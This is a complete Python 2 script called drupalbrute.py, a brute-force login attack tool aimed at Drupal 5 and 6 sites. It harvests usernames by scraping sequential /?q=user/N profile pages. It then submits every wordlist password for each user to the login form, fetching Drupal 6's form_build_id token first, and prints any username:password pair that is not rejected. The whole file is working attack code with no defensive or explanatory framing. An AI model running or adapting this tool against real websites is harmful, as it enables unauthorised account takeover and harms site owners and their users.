import urllib, urllib2
import sys, getopt

from urllib2 import Request, urlopen, URLError, HTTPError

global maxrange, target, wordlist, userlist, usernames, passwords, version
passwords = []
usernames = []
maxrange = 3
version = 5

def handle_args():
    global target, wordlist, maxrange, userlist, version
    try:
        opts, args = getopt.getopt(sys.argv[1:], "h", ["help", "number=", "wordlist=", "target=", "userlist=", "version="])
    except getopt.GetoptError, err:
        # print help information and exit:
        print str(err) # will print something like "option -a not recognized"
        usage()
        sys.exit(2)
    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
            sys.exit()
        elif o in ("-n", "--number"):
            maxrange = int(a) 
        elif o == "--target":
            target = a
        elif o == "--wordlist":
            wordlist = a
        elif o == "--userlist":
            userlist = a
        elif o == "--version":
            version = a
        else:
            assert False, "unhandled option"
  
# set up defaults          
    try:
        target
    except NameError:
        target = 'None'
    if target == 'None':
        print "You must specify a target!"
        usage()
        sys.exit()
        
    try:
        wordlist
    except NameError:
        wordlist = 'None'
    if wordlist == 'None':
        print "You must specify a wordlist!"
        usage()
        sys.exit()
        
    try:
        userlist
    except NameError:
        userlist = 'None'
            
def usage():
    print "Usage: drupalbrute.py [--number=max number of user ids] [--target=target URL] [--wordlist=file] [--userlist=file] [--version=6 (5 is default)]"
    
def read_passwords():
    global wordlist, passwords
    f = open(wordlist, 'r')
    for line in f:
        passwords.append(line)
    if len(passwords) == 0:
        usage()
        sys.exit()
        
def read_userlist():
    global userlist, passwords
    f = open(userlist, 'r')
    for line in f:
        usernames.append(line.strip())
    if len(usernames) == 0:
        usage()
        sys.exit()
    
def discover_users():
    global target, usernames, maxrange
    for i in range(1,maxrange):
        try:
            target
        except NameError:
            target = 'None'
            
        if target == 'None':
            usage()
            sys.exit()
        url = target + "/?q=user/"
        request_url = url + str(i)
        try: 
            #print "Trying " + request_url
            response = urllib2.urlopen(request_url)
            the_page = response.read()
            uname_start = the_page.find('User account</a></div>')
            uname_start = the_page.find('<h2>', uname_start) + 4
            if uname_start > 17:
                uname_end = the_page.find('</h2>', uname_start)
                #print the_page[uname_start:uname_end]
                usernames.append(the_page[uname_start:uname_end])
        except HTTPError, e:
            error = 'Error at ' + request_url + ' ' + str(e.code)
        
handle_args()
read_passwords()
if (userlist == 'None'):
    discover_users()
else:
    read_userlist()
print "Please wait, working..."
        
# Brute force the account
if version < 6:
    if len(usernames) > 0:
        for user in usernames:
            for passw in passwords:
                data = {
                    'name': user,
                    'pass': passw,
                    'form_id': 'user_login'
                }
                urldata = urllib.urlencode(data)
                url = target + "/?q=user"
                results = urllib.urlopen(url, urldata).read()
                if results.find('Sorry, unrecognized username or password.') == -1:
                    print user + ":" + passw.strip()
else:
    print "Drupal 6"
    # get a copy of the form first
    url = target + "/?q=user"
    formid = ''
    try: 
        response = urllib2.urlopen(url)
        the_page = response.read()
        formid_start = the_page.find('name="form_build_id"')
        if (formid_start < 0):
            print "Sorry, can't find form_build_id field"
            sys.exit()
        formid_start += 25
        formid = the_page[formid_start:formid_start+37]
    except HTTPError, e:
        error = 'Error at ' + request_url + ' ' + str(e.code)
    if len(usernames) > 0:
        for user in usernames:
            for passw in passwords:
                data = {
                    'name': user,
                    'pass': passw,
                    'form_build_id': formid,
                    'form_id': 'user_login',
                    'op': 'Log in'
                }
                urldata = urllib.urlencode(data)
                url = target + "/?q=user"
                results = urllib.urlopen(url, urldata).read()
                if results.find('Sorry, unrecognized username or password.') == -1:
                    print user + ":" + passw.strip()
